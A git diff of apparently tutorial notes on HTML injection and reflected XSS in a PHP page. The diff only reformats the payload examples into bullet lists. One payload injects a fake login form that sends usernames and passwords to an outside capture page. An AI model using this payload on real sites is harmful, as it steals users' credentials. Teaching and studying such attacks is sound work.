@@ -271,11 +271,11 @@ echo “Hello $firstname $lastname!”;
 ```
 
 Payload:
-```
-firstname:		<i>John</i>
-lastname:		<u>Doe</u>
-Output: 		Hello John Doe!
-```
+
+- firstname: `<i>John</i>`
+- lastname: `<u>Doe</u>`
+- Output: `Hello John Doe!`
+
 ## XSS Reflected
 
 Form Injection
@@ -290,12 +290,13 @@ echo “Hello $firstname $lastname!”;
 ```
 
 Payload:
-```
-firstname: `<form action=”http://www.mysite.it/capture_page.php”>
+
+- firstname: `<form action=”http://www.mysite.it/capture_page.php”>
                 Username: <input name=”user” type=”text”/><br/>`
-lastname:  `Password: <input name=”pass” type=”password”/>
+- lastname:  `Password: <input name=”pass” type=”password”/>
             </form>`
-Output:    `Hello [ Fake login form ]!`
+- Output:    `Hello [ Fake login form ]!`
+
 
 Read GET parameters - EXPLOIT
 XSS Reflected
